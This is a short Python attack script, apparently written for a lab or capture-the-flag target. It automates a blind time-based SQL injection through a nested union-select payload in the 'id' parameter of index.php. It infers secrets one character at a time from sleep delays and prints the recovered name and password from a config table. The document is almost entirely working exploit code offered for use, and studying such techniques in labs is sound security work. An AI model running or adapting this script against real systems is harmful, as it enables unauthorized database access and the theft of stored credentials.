```python
#!/usr/bin/python3
import requests
import sys
import re
import subprocess
import time
import argparse

#disable ssl warnings
requests.packages.urllib3.disable_warnings()

def proxy(flag):
    return {"http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080"} if flag else None

def printYellow(text): print("\033[93m {}\033[00m" .format(text))
def printYellowWhite(text, text2): print("\033[93m {}\033[00m{}" .format(text, text2))
def printYellowWhiteSL(text, text2): print("\033[93m {}\033[00m{}" .format(text, text2), end="\r")
def printRed(text): print("\033[91m {}\033[00m" .format(text))
def printGreen(text): print("\033[92m {}\033[00m" .format(text))
def printGreenWhite(text, text2): print("\033[92m {}\033[00m{}" .format(text, text2))

def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="Target IP")
    parser.add_argument('-x', '--proxy', action="store_true", help="Use http proxy to debug")

    if len(sys.argv) < 2:
        parser.print_help(sys.stderr)
        sys.exit(-1)

    return parser.parse_args()

# /index.php?id=587'+union+select+"1'+union+select+if((substring((select+name+from+users),1,1)='m'),sleep(3),null)'--+-"--+-

def sqli_exe(target, sqli, proxy):
    res = requests.get(f"{target}" + sqli, verify=False, proxies=proxy)
    response_time = res.elapsed.total_seconds()

    if response_time > 1.0:
        return True
    else:
        return False

def get_single_element_from_table(target, switch, proxy):
    dictionary = "qwertyuiopasdfghjklzxcvbnm1234567890_"
    result = ""
    stop = 0

    for x in range(1,60):
        for letter in dictionary:
            sqli = f"/index.php?id=587\'+union+select+\"1\'+union+select+if((substring((select+option_name+from+config+where+id={switch}),{x},1)=\'{letter}\'),sleep(2),null)\'--+-\"--+-"

            if sqli_exe(target, sqli, proxy):
                result = result + letter
                stop = stop + 1
                printYellowWhiteSL("[*] Current progress: ", result)
                break
        if x > stop:
            break
    return result

if __name__ == "__main__":
    args = arguments()

    name = get_single_element_from_table(args.target, "72", proxy(args.proxy))
    print()
    printGreenWhite("[+] Found name: ", name)

    password = get_single_element_from_table(args.target, "73", proxy(args.proxy))
    print()
    printGreenWhite("[+] Found password: ", password)
```
